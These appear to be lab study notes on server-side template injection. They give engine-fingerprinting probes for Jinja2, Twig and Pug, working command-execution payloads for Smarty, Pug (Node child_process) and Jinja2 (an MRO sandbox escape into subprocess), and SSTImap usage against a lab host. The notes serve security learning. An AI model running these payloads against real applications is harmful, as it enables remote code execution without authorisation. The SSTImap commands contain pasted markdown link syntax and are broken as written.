## 🔎 Engine Identification


Template engines process syntaxes uniquely, enabling fingerprinting through mathematical payload evaluation. Distinct engine behaviors reveal the underlying technology.

```text
# Payload to differentiate Jinja2 from Twig based on string multiplication
{{7*'7'}}
```
* Tool: Browser / Proxy Intercept

If the engine is Twig, the output resolves to 49. If the engine is Jinja2, the output resolves to 7777777.

Pug (formerly Jade) processes JavaScript expressions directly within specific delimiters.

```pug
# Pug template syntax evaluation check
#{7*7}
```
* Tool: Browser / Proxy Intercept

If the engine is Pug, the output resolves to 49 without requiring standard curly brace delimiters.

## 🎯 Smarty Exploitation
Target verification requires injecting base tags to confirm processing prior to payload deployment.

```smarty
# Smarty pipeline tag injection to verify engine processing
{'Hello'|upper}
```
* Tool: Browser / Proxy Intercept

A response of HELLO confirms Smarty implementation. If Smarty security policies permit PHP function execution, direct system commands can be injected.

```smarty
# Smarty payload utilizing PHP system function for OS command execution
{system("ls")}
```
* Tool: Browser / Proxy Intercept

## 🟢 Pug Exploitation
Pug permits direct JavaScript interpolation. Exploitation leverages Node.js core modules.

```javascript
# Node.js structural requirement for separating commands and arguments in spawnSync
const { spawnSync } = require('child_process');
const result = spawnSync('ls', ['-lah']);
console.log(result.stdout.toString());
```
* Tool: Node.js Syntax Reference

The payload bypasses inclusion restrictions by dynamically requiring the child_process module via the global process object. The spawnSync method executes the command synchronously, with arguments passed as an array to ensure correct parsed execution.

```pug
# Pug payload utilizing Node.js core modules to achieve RCE with arguments
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```
* Tool: Browser / Proxy Intercept

## 🐍 Jinja2 Exploitation


Jinja2 verification utilizes standard expression syntax. Upon confirmation, exploitation requires traversing the Python Method Resolution Order (MRO) to escape the template sandbox and access system modules.

```jinja2
# Jinja2 template syntax evaluation check
{{7*7}}
```
* Tool: Browser / Proxy Intercept

The subsequent payload dynamically imports the subprocess module to execute OS commands.

```jinja2
# Jinja2 sandbox escape payload utilizing MRO traversal to execute OS commands
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```
* Tool: Browser / Proxy Intercept

Component breakdown:
* `"".__class__.__mro__[1]` accesses the base object class.
* `__subclasses__()` enumerates all subclasses.
* `[157]` is the targeted index for `subprocess.Popen` (index requires environmental validation).
* Method chains dynamically import `subprocess` and execute the provided command, capturing standard output.

## ⚙️ Automated SSTI Assessment
Manual payload crafting can be supplemented with automated exploitation frameworks mapped to known vulnerabilities across varying template engines.

```bash
# Clone and execute SSTImap for automated template engine discovery and exploitation
git clone [https://github.com/vladko312/SSTImap.git](https://github.com/vladko312/SSTImap.git)
cd SSTImap
python3 sstimap.py -u "[http://target.thm/page?param=inject](http://target.thm/page?param=inject)"
```
* Tool: SSTImap
